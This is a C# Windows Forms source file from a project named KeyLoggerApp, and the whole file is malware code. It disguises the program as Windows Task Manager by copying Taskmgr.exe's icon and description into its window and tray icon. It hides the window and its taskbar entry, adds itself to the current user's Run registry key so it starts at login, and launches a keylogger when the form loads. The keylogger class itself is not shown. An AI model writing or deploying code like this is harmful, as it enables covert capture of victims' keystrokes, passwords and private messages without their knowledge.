using System.Diagnostics;
using Microsoft.Win32;

namespace KeyLoggerApp
{
    public partial class Form1 : Form
    {
        private KeyLogger keyLogger;
        private NotifyIcon notifyIcon;

        public Form1()
        {
            notifyIcon = new NotifyIcon();

            //===== Camouflage avec TaskManager =====
            string targetAppName = "Gestionnaire des tâches";
            string exeFilePath = @"C:\Windows\system32\Taskmgr.exe";
            if (File.Exists(exeFilePath))
            {
                Icon appIcon = Icon.ExtractAssociatedIcon(exeFilePath);
                appIcon = new Icon(appIcon, new Size(appIcon.Width, appIcon.Height));
                this.Icon = appIcon;

                notifyIcon.Icon = appIcon;
                notifyIcon.Visible = true;

                FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(exeFilePath);
                targetAppName = versionInfo.FileDescription;
            }

            InitializeComponent();
            keyLogger = new KeyLogger();
            this.ShowInTaskbar = false;
            this.Text = targetAppName;
            notifyIcon.Text = targetAppName;

            RegisterProgramInStartup(targetAppName);
        }

        private void RegisterProgramInStartup(string appName)
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            if (registryKey.GetValue(appName) == null)
            {
                registryKey.SetValue(appName, Application.ExecutablePath);
            } else
            {
                string existingPath = registryKey.GetValue(appName).ToString();
                if (!existingPath.Equals(Application.ExecutablePath, StringComparison.OrdinalIgnoreCase))
                {
                    registryKey.SetValue(appName, Application.ExecutablePath);
                }
            }
        }


        protected override void OnLoad(EventArgs e)
        {
            keyLogger.StartLogging();
            base.OnLoad(e);
            WindowState = FormWindowState.Minimized;
            Hide();
        }
    }
}
